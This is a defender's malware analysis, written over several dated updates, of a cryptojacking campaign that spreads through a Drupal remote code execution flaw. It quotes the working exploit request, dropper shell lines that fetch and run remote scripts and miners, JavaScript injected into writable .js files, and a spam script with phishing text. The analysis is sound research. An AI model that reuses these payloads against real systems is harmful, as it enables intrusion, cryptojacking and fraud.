# Drupal Exploit Analysis 

### 21/05/2018

Today I got some weird requests that caught my attention.   
  
XXXXXXXXXX.XXX/?q=user/password&name[#post_render][]=passthru&name[#markup]=wget%20-O%20/tmp/a.sh%20hxxp://51.255.91.41/a.sh;%20sh%20/tmp/a.sh&name[#type]=markup  
  
Do you remember Drupal? Someone is trying to execute remote code in one of our servers. Let's see what it's trying to do:  
  
The a.sh file contains some interesing things. First of all, it sets up a path to work properly:  
  
>ipath=\`find / -xdev -writable -executable -type d -print | shuf -n 1\`  
  
It searches for directories where, with the user that is executing it, has writable and executable permissions. It will work there.  
  
For statistics purposes (I supose), it makes a request to the resource hxxp://51.255.91.41/zz.php with the type parameter set with the servers info.   
  
>wget -O /dev/null "hxxp://51.255.91.41/zz.php?type=\`uname -a\`"  
  
After that, it downloads another file, a python script. We will analyse that later.  
  
>wget -O $ipath/t.py hxxp://51.255.91.41/scrape2.py  
  
What's the first think It does? Yes, as you thought. It downloads a miner and runs it.  
  
>wget -O $ipath/luk.tgz hxxp://www.lukminer.net/releases/latest.tgz  
>cd $ipath  
>tar -xzvf luk.tgz  
>chmod +x luk-cpu  
>./luk-cpu -a xmr-v7 --host 51.255.91.41 --port 443 --user luk --pass x --no-fail-on-malloc > /dev/null&  
  
Then, it erases itself.  
  
>rm -rf a.sh  
  
It's funny, because it actually **does not run the python script**. It's programmed to do so, but It seems that it's in the development fase T.T'  
In the a.sh has commented the following lines:  
  
>for i in \`seq 1 2\`; do  
>#python $ipath/t.py > /dev/null&  
>done  
  
Let's see what it WILL do:  
  
First of all, it sets some variables:  
  
>threadcount = 25  
>timeout = 5  
>serverurl = "hxxp://51.255.91.41/y.php"  
>domain_queue = Queue()  
>threads = []  
  
Here we find what seems a whitelist domain list:  
  
>bl = ['facebook', 'ebay', 'linkedin', '.gov', 'microsoft', 'google']  
  
We don't want to bother the big guys >.<  
And it has a **propagation** function named drupal:  
  
>def drupal(target)  
  
It crafts the url with the payload and makes the request.  
  
>payload = "name[%23post_render][]=passthru&name[%23markup]=wget%20-O%20/tmp/a.sh%20hxxp://51.255.91.41/a.sh;%20sh%20/tmp/a.sh&name[%23type]=markup"  
                  
>url = target + "?q=user/password&" + payload  
  
How gets the next targets? It asks the server (serverurl) for an URL list to target. It gets the following response (actual response):  
  
>hxxp://www.komornikrzeszow.com/  
>hxxp://www.labkotec.se/  
>hxxps://inl.info.ucl.ac.be/  
>hxxp://www.austrolinks.info/  
>hxxp://www.proedgekettlebells.com/  
  
  
After it has the new victim list, it calls a "scrapedomain" function that tries to guess if the domain has drupal or not and if it has drupal, tries to exploit the victim's domain.  
  
**It has no persistency mechanism so far.**


### 22/05/2018 (UPDATE)

Well, It's evolving. We have an update. Now it adds another file:  

>wget -O /dev/null "hxxp://51.255.91.41/zz.php?type=\`uname -a\`"  
>wget -O $ipath/php5 hxxp://51.255.91.41/php5  
>wget -O $ipath/t.py hxxp://51.255.91.41/scrape2.py  

The php5 file is just another miner:  

>md5sum php5   
>7ac1ed7f6aec0fbc7ad2e89eb20e71dc  php5  

But it seems that is a better one, because It preferres this  instead of the other one:  

>$ipath/php5 -o 51.255.91.41:443 -u auto -p x --max-cpu-usage=100 --donate-level=1 -B  
>if [ $? -eq 0 ]; then  
>    echo "."  
>else  
>        wget -O $ipath/luk.tgz hxxp://www.lukminer.net/releases/latest.tgz  
>        cd $ipath  
>        wget -O $ipath/startit.sh hxxp://51.255.91.41/startit.sh  
>        tar -xzvf luk.tgz  
>        chmod +x luk-cpu  
>        #./luk-cpu -a xmr-v7 --host 51.255.91.41 --port 443 --user luk --pass x --no-fail-on-malloc > /dev/null&  
>        sh ./startit.sh > /dev/null&  
>fi  

And it downloads a "startit.sh" file (like He-Who-Must-Not-Be-Named), but it just runs the miner:  

>for x in \`seq 1 1000\`; do  
>./luk-cpu -a xmr-v7 --host 51.255.91.41 --port 443 --user luk --pass x --no-fail-on-malloc  
>done  

Now it actually propagates it (in fact, this time I've received the exploit from another server). Which means, that our server is in its list:  

>for i in \`seq 1 2\`; do  
>python $ipath/t.py > /dev/null&  
>done  

In the **compromised_servers_22052018.txt** file are the servers which attacked our server. It seems that they are compromised.  

**It will be continued...**  

### 23/05/2018 (UPDATE)  

**Added the list of compromised servers of 23/05/2018 and also the domain list it is targeting.**  

### 24/05/2018 (UPDATE)  

Disappointing news. Today, in the version 3 release, there's only coding improvements.  

Instead of killing all the other miners this way:  

>kill -9 \`pidof php5\`  
>kill -9 \`pidof python\`  
>kill -9 \`pidof luk-cpu\`  
>kill -9 \`pidof xmrig\`  
>kill -9 \`pidof xmrig-cpu\`  

It has noticed that there could be more than one thread, so it adds a loop:  

>for i in \`pidof luk-cpu\`; do  
>   pid=$i  
>   ppid=\`ps -p $pid -o ppid=\`  
>   kill -9 $ppid $pid  
>done  
>for i in \`pidof php5\`; do  
>   pid=$i  
>   ppid=\`ps -p $pid -o ppid=\`  
>   kill -9 $ppid $pid  
>done  

Other change is the way it runs the miner. Now, if the following sentence goes wrong:  

>$ipath/php5 -o 51.255.91.41:443 -u auto -p x --max-cpu-usage=100 --donate-level=1 -B  

It downloads another file, startit2.sh. Like startit.sh, just runs the miner. Let's see  the differences:  

startit2.sh  
>for i in \`seq 1 1000\`; do  
>./php5 -o 51.255.91.41:443 -u auto2 -p x --max-cpu-usage=100 --donate-level=1  
>done  

startit.sh  
>for x in \`seq 1 1000\`; do  
>./luk-cpu -a xmr-v7 --host 51.255.91.41 --port 443 --user luk --pass x --no-fail-on-malloc  
>done  

And if that also doesn't work, it downloads the luk miner as its last option.  

**Added the list of compromised servers of 24/05/2018**

### 29/05/2018 (UPDATE)   

We are back with the series. New release, this time major changes. First of all, it runs de a.sh, but it's a total diferent a.sh. It should be renamed. At least, b.sh. Just saying.  

Now, it tells the server that the process has started, by setting the parameter "a" to "init". Then, it downloads a package of files.  

>wget -O /dev/null hxxp://51.255.91.41/zz.php?a=init  
>wget -O $ipath/pack.tgz hxxp://51.255.91.41/pack.tgz  

It extracts the files and runs "i":  

>87b4230ee789a5e1501bd3ef5e283978  i  
>  
>i: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=23a9277597f90c17f62bf7c4ffa80f3661691cd0, not stripped  

"i" is a binary that does basically this: 

>wget -O /dev/null 51.255.91.41/zz.php?a=start  
>sh ./pre.sh  
>sh ./ktc.sh  
>python ./scrape2.py&  
>./php5 -o 51.255.91.41:443 -u nphp5 -p x --max-cpu-usage=100 --donate-level=1  
>sh ./startjce.sh  
>./luk-cpu -a xmr-v7 --host 51.255.91.41 --port 443 --user nluk --pass x --no-fail-on-malloc   
>./xmrigDaemon  
>wget -O /dev/null 51.255.91.41/zz.php?a=finish  

It tells the server that the binary has started, then runs pre.sh and ktc.sh. This bash scripts just kill other miners. After this, it runs the scrape2.py. This was the script that cause propagation using the drupal exploit. But now It's more respectful, it has whitelisted more stuff:  

>bl = ['facebook', 'ebay', 'linkedin', '.gov', 'microsoft', 'google', 'wikipedia', 'wikimedia', 'hotel', 'motel']  

After that, it goes hard to the mine. It runs all the miners. Now, it's trying 4 different miners with different configs. The first one, php5 with the following info:  

> 7ac1ed7f6aec0fbc7ad2e89eb20e71dc  php5   
>  
>Server: 51.255.91.41  
>Port: 443  
>User: nphp5  

The second one, jce_cn_cpu_miner, with the following config:

>305150c7f73d03b6f746c12d88348bb4  jce_cn_cpu_miner32  
>c4cbc5e91ee35d6743b2db24985870fd  jce_cn_cpu_miner64  
>  
>POOL="51.255.91.41"  
>PORT=443  
>SSL=""  
>WALLET=njce  
>PASSWORD=x  

The third one is the one used in the alfa version, the luk-cpu:  

>a6617c5cb59135e05799498d264564c7  luk-cpu  
>  
>Server: 51.255.91.41  
>Port: 443  
>User: nluk  

And the last one:

>74d5938fa520004f485923bcacf0d6b3  xmrigDaemon  
>cdc1e47d08bc49da19a8fd17a9e7bb67  xmrigMiner  
>23dafaf71f7b95d038914e57a25e22c9  xmr-stak  

Then, it tells the server that the process finished successfully by setting the "a" parameter to "finish."  


### 31/05/2018 (UPDATE)   

New feature. If you thought that 4 miners were enough... The new a.sh downloads another file, template.js:

>wget hxxp://51.255.91.41/template.js  
>  
>for f in \`find / -xdev -writable -name '*.js'\`; do  
>  cat template.js >> $f  
>done  

Currently, it doesn't use the $f variable, but I'm sure it will. This file creates an iframe that points to new html code:  

>document.addEventListener("DOMContentLoaded", function(event) {  
>        var iframe = document.createElement('iframe');  
>        iframe.style.display = "none";  
>        iframe.src = "hxxp://51.255.91.41/iframe.php";  
>        document.body.appendChild(iframe);  
>});  


And guess what? Yes, it's another miner.  

>\<script src="hxxps://coinhive.com/lib/coinhive.min.js"></script>  
>\<script>  
>        var miner = new CoinHive.Anonymous('YqCFCCcVkHsHLeJ3OfLRp7MRfZMNqdqf', {throttle: 0.1});  
>        miner.start();  
>\</script>  

Stay tuned for the new features to come...  

### 05/06/2018 (UPDATE)  
  
A week after the last release, we get another feature. The "a.sh" now does another functionality check. After downloading the new pack.tgz:
  
>4791d8e2c9cbfa0e56cc35d4582e86c1  pack.tgz  
  
it runs "i", and if it doesn't work, now it runs only the miners:  
  
>./i  
>if [ $? -eq 0 ]; then  
>        echo .  
>else  
>        python ./scrape2.py > /dev/null&  
>        ./php5 -o 51.255.91.41:443 -u nphp5 -p x --max-cpu-usage=100 --donate-level=1  
>        sh ./startjce.sh  
>        ./luk-cpu -a xmr-v7 --host 51.255.91.41 --port 443 --user nluk --pass x --no-fail-on-malloc  
>        ./xmrigDaemon  
>fi  
  
The "i" is a little bit different from last time. 
  
>3b8d36d191bd29f7f77af6ade931687b  i  
  
Now it runs also the "eml.sh" script. This is where things got interensting:  
   
>wget -O /dev/null 51.255.91.41/zz.php?a=start
>sh ./pre.sh
>sh ./ktc.sh
>**sh ./eml.sh &**
>python ./scrape2.py&
>./php5 -o 51.255.91.41:443 -u nphp5 -p x --max-cpu-usage=100 --donate-level=1
>sh ./startjce.sh
>./luk-cpu -a xmr-v7 --host 51.255.91.41 --port 443 --user nluk --pass x --no-fail-on-malloc
>./xmrigDaemon
>wget -O /dev/null 51.255.91.41/zz.php?a=finish
  
This script is used for spam purposes. 
  
>wget http://51.255.91.41/body.txt  
>wget http://51.255.91.41/subjects.txt  
>wget -O emails.txt http://51.255.91.41/email.php  
>for i in \`cat emails.txt\`; do  
>   cat body.txt | mail -s "\`cat subjects.txt | shuf -n 1\`" $i  
>   sleep 10  
>done   
  
It downloads the body of the mail:  

>Earn £10-20k Per Month from Crypto  
>  
>100% Proven & Guaranteed  
>  
>More than 50,000 UK citizens already earning every month  
>  
>Sign Up Here:  
>  
>hxxps://bit.ly/2LoC8C7  

This link in the body, points to "hxxps://code-net-system.com/Bitcoin/?transaction_id=102586867342a7144cad0e93ced908&affiliate_id=1357&param1=". (62.90.102.114) This seems a phishing site.

Also, it downloads a list of 60 possible subjects. Here is a sample of them:  
  
>Earn £10-20k Per Month from Crypto  
>£10k per month income from Crypto  
>Join the Crypto Revolution!  
>Make money with Crypto Industry  
>Join millions of people and earn money with crypto  
>Millions of people earning £5-10k per month  
>£10k per month easily with Crypto  
>Increase your networth 10x in 3 months  
>You can earn £5-10k every month with Crypto  
>How Cryptocurrency Is Making Ordinary People Rich  
  
Then, in the same way as the domain list, it asks for a list of email destinataries. Here is a sample of them:
  
>***con**@live.co.uk  
>***foot**@hotmail.com  
>***bonb**@yahoo.co.uk  
>***hig**@msn.com  
>***fessions6**@hotmail.co.uk  
>***caldwe**@hotmail.com  
>***flict.madk**@hotmail.co.uk  
>***cordegui**@btinternet.com  
>***eill8**@hotmail.co.uk  
>***iferda**@gmail.com  
  
If we see the time of the **last modification** of the files, the **mail domains**, the **mail body** and the possible **subjects** (£), it seems that the author comes from the UK.  
  
We are getting closer to the final meeting ^^  

